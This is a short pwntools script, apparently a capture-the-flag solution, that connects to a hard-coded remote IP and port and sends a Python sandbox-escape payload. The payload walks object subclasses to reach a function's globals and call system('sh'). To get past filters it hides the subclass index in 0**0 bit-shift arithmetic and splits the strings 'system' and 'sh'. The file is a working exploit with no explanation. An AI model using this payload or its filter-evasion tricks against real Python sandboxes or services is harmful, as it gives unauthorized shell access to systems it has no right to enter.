from pwn import remote

host = '192.214.171.83'
port = 3001

conn = remote(host, port)

text = conn.recvuntil(b'> ').decode().strip()
print(text)

payload = '().__class__.__base__.__subclasses__()[(0**0<<((((0**0<<0**0)<<0**0)<<0**0)-0**0))-(-(0**0<<((0**0<<0**0)<<0**0)))-(-(0**0<<(((0**0<<0**0)<<0**0)-0**0)))-(-(0**0<<(0**0<<0**0)))-(-(0**0<<(0**0-0**0)))].__init__.__globals__["sy""stem"]("s""h")'
conn.writeline(payload)

text = conn.recvuntil(b'> ').decode().strip()
print(text)

conn.writeline(b'q')
conn.close()
